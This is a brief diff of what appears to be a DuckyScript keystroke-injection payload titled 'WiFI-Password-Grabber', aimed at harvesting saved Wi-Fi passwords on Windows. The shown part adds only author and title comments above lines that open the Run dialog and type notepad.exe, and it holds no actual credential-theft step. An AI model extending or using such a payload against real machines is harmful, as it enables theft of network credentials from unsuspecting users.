@@ -1,3 +1,5 @@
+REM Author - Pulkit Singh Singhania - https://www.youtube.com/pulkitsinghaniapulkittech/ - psinghania929@gmail.com
+REM WiFI-Password-Grabber-v1.0_(Works on Every Version Of Windows Without Any Bug)
 GUI r
 DELAY 500
 STRING notepad.exe
